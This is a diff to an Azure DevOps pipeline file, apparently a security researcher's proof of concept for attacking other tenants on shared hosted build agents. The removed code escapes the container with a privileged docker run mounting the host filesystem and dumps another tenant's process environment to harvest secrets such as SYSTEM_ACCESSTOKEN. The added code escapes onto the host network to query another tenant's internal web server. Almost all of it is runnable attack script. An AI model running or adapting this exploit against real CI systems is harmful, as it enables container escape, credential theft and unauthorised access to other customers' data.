@@ -8,16 +8,16 @@ name: $(Date:yyyyMMdd)$(Rev:.r)
 
 stages:
 - stage: FinalPoc
-  displayName: 'Final PoC: Cross-Tenant Process Snooping'
+  displayName: 'Final PoC: Accessing Cross-Tenant Web Service'
   jobs:
-  - job: Host_Escape_And_Process_Snooping
-    displayName: 'PoC: Steal Secrets from Other Tenant Processes'
+  - job: Access_Internal_Web_Service
+    displayName: 'PoC: Access Other Tenants Internal Web Service'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
     - checkout: none
     - task: Bash@3
-      displayName: 'Escape Container and Inspect Host Processes'
+      displayName: 'Escape Container and Query the Discovered Mono Web Server'
       inputs:
         targetType: inline
         script: |
@@ -32,44 +32,41 @@ stages:
           fi
           echo "✅ Confirmed user is in 'docker' group."
 
-          echo "--- ESCAPING CONTAINER to inspect all processes on the host ---"
+          # The target is the localhost from the host's perspective,
+          # accessing the Mono XSP4 server we discovered.
+          TARGET_URL="http://127.0.0.1:8084"
+
+          echo "--- ESCAPING CONTAINER to probe ${TARGET_URL} ---"
           
-          # This command will escape to the host and run a script to analyze processes.
-          # We are looking for any process NOT owned by root or our own user (vsts).
-          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
+          # We escape to the host network and use curl to talk to the service.
+          docker run --rm --privileged --network=host \
             -v $(pwd)/artifacts:/artifacts \
             alpine:latest sh -c "
-              echo '--- [HOST] Listing all running processes with user info and command... ---'
-              # Use -eo to specify exact output columns for easy parsing.
-              chroot /hostfs /bin/ps -eo pid,user,cmd > /artifacts/full-process-list.txt
+              apk add --no-cache curl
 
-              echo '--- [HOST] Searching for a potential victim process from another tenant... ---'
-              # Find the PID of a process that is not ours and not root/system.
-              # We look for common build commands. This is our best bet to find another job.
-              VICTIM_PID=\$(cat /artifacts/full-process-list.txt | grep -E 'npm|mvn|dotnet|python|sh -c' | grep -v 'vsts' | grep -v 'root' | awk '{print \$1}' | head -n 1)
-
-              if [ -z \"\$VICTIM_PID\" ]; then
-                echo '⚠️ No obvious victim process found in this run. The host may not be shared at this exact moment.'
-                echo 'Check full-process-list.txt to manually verify.'
-              else
-                echo \"✅ POTENTIAL VICTIM FOUND! Process ID: \$VICTIM_PID\"
-                
-                echo '--- [HOST] Dumping environment variables from victim process \$VICTIM_PID ---'
-                # The 'environ' file is null-delimited, so we use 'tr' to make it readable.
-                chroot /hostfs /bin/cat /proc/\$VICTIM_PID/environ | tr '\\0' '\\n' > /artifacts/victim-environment-variables.txt
-                
-                echo \"✅✅✅ SMOKING GUN: Successfully dumped environment variables from another process.\"
-                echo \"Check 'victim-environment-variables.txt' for secrets like SYSTEM_ACCESSTOKEN.\"
-              fi
+              echo '--- [HOST] Attempting a standard HTTP GET request to the internal Mono server ---'
+              
+              # Use curl with verbose logging to capture everything.
+              curl --verbose --connect-timeout 20 \"${TARGET_URL}\" > /artifacts/web-server-response-body.html 2> /artifacts/web-server-response-headers.txt || true
             "
           
-          echo "--- SCRIPT COMPLETE. Final artifacts are being published. ---"
-          echo "Full process list:"
-          cat artifacts/full-process-list.txt | head -n 30
-          
+          echo "✅ PROBE COMPLETE."
+          echo "--- Curl stderr (Connection Details & Headers) ---"
+          cat artifacts/web-server-response-headers.txt
+          echo
+          echo "--- Curl stdout (Response Body) ---"
+          cat artifacts/web-server-response-body.html
+
+          if grep -q "Connected to" artifacts/web-server-response-headers.txt; then
+            echo "✅✅✅ SMOKING GUN CONFIRMED: Successfully retrieved data from another tenants internal web server."
+            echo "The contents of 'web-server-response-body.html' are the conclusive evidence."
+          else
+            echo "⚠️ Test failed. The web server might have terminated before the probe."
+          fi
+
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Process Snooping Artifacts'
+      displayName: 'Publish Web Server Response Artifacts'
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-final-poc-process-snooping'
+        artifact: 'azure-final-proof-of-access'
